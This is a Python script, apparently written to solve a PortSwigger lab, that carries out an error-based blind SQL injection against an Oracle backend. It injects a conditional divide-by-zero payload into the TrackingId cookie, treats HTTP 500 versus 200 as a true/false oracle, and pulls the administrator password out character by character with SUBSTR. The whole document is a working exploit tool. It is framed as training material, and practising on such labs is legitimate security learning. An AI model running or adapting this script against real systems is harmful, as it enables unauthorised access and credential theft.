#!/usr/bin/env python3
"""
Blind SQL Injection con ERRORES condicionales (base de datos Oracle)
Lab de PortSwigger.

SEMAFORO (distinto al anterior): no hay "Welcome back". Forzamos un error
de division por cero (1/0) SOLO cuando nuestra condicion es verdadera:
    condicion VERDADERA -> error -> HTTP 500
    condicion FALSA     -> sin error -> HTTP 200

Como es Oracle, usamos: FROM dual, SUBSTR, LENGTH y concatenacion con ||.

USO: solo en el lab o con autorizacion. En Kali:
    python3 extraer_password_errores.py

Si el lab se reinicia, actualiza LAB / SESSION / TRACKING con los valores
nuevos que veas en Burp.
"""
import string
import sys

try:
    import requests
except ImportError:
    sys.exit("Falta 'requests'. Instala con: pip install requests")

# ----- CONFIGURA ESTO (copialo de Burp si cambia el lab) -----
LAB      = "https://0acc00250431cc6680a30868005700ee.web-security-academy.net"
SESSION  = "cUWJVFI4Iroj2g6Wafz79SjjsUcJvnvE"
TRACKING = "fJXXuYXVxrXL5Vqx"
# -------------------------------------------------------------

CHARS = string.ascii_lowercase + string.digits   # minusculas + numeros


def _status(payload_cookie):
    """Envia la cookie con la inyeccion y devuelve el codigo de estado HTTP."""
    cookie = f"TrackingId={TRACKING}{payload_cookie}; session={SESSION}"
    r = requests.get(LAB + "/", headers={"Cookie": cookie},
                     timeout=15, allow_redirects=False)
    return r.status_code


def verdad(cond, fuente="dual"):
    """True si la condicion SQL es verdadera (provoca error 500)."""
    p = (f"' || (SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) "
         f"ELSE '' END FROM {fuente}) || '")
    return _status(p) == 500


def main():
    # 0) Comprobar que el semaforo responde
    print("[*] Comprobando el semaforo de error...")
    if not (verdad("1=1") and not verdad("1=2")):
        sys.exit("[!] El semaforo no responde bien. Revisa LAB/SESSION/TRACKING "
                 "(el lab pudo reiniciarse).")
    print("[+] Semaforo OK (1=1 -> 500, 1=2 -> 200).")

    fuente = "users WHERE username='administrator'"

    # 1) Confirmar que existe administrator
    print("[*] Confirmando que existe 'administrator'...")
    if not verdad("1=1", fuente):
        sys.exit("[!] No se encuentra el usuario administrator / la tabla users.")
    print("[+] administrator existe.")

    # 2) Longitud de la contrasena
    print("[*] Buscando la longitud de la contrasena...")
    longitud = None
    for n in range(1, 60):
        if not verdad(f"LENGTH(password)>{n}", fuente):
            longitud = n
            break
    if not longitud:
        sys.exit("[!] No pude determinar la longitud.")
    print(f"[+] Longitud = {longitud} caracteres.")

    # 3) Extraer caracter a caracter con SUBSTR
    print("[*] Extrayendo la contrasena...")
    password = ""
    for pos in range(1, longitud + 1):
        for c in CHARS:
            if verdad(f"SUBSTR(password,{pos},1)='{c}'", fuente):
                password += c
                print(f"    [{pos:>2}/{longitud}]  {password}")
                break
        else:
            password += "?"
            print(f"    [{pos:>2}/{longitud}]  {password}  (no encontrado)")

    print("\n" + "=" * 50)
    print(f"  CONTRASENA de 'administrator': {password}")
    print("=" * 50)
    print(f"\nEntra en el lab -> My account -> login:")
    print(f"  usuario:    administrator")
    print(f"  contrasena: {password}")


if __name__ == "__main__":
    main()
